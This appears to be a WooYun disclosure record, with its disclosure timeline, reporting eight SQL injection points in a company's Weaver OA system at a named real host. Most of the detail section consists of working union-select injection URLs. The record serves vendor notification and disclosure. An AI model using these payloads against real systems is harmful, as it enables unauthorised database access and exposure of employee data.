wybug_title: 爱屋吉屋某系统8处sql注入可泄露大量员工信息
wybug_detail:
漏洞详情 披露状态：   									2015-12-04：	细节已通知厂商并且等待厂商处理中									2015-12-04：	厂商已经确认，细节仅向厂商公开									2015-12-14：	细节向核心白帽子及相关领域专家公开									2015-12-24：	细节向普通白帽子公开									2016-01-03：	细节向实习白帽子公开									2016-01-18：	细节向公众公开  简要描述： sql注入 求首页 感觉不会再爱了 详细说明：  http://oa.superjia.com/ 泛微的系统 没有及时打上补丁存在漏洞的页面 每个都可以/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,3,@@version,5,6,7/pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1 union select 1,2,3,@@version,5,6,7/pweb/careerapply/HrmCareerApplyWorkEdit.jsp?id=1 union select 1,2,3,@@version,5,6/pweb/careerapply/HrmCareerApplyWorkView.jsp?id=1 union select 1,2,3,@@version,5,6/web/careerapply/HrmCareerApplyPerEdit.jsp?id=1 union select 1,2,3,@@version,5,6,7/web/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,3,@@version,5,6,7/web/careerapply/HrmCareerApplyWorkEdit.jsp?id=1 union select 1,2,3,@@version,5,6/web/careerapply/HrmCareerApplyWorkView.jsp?id=1 union select 1,2,3,4,5,@@version
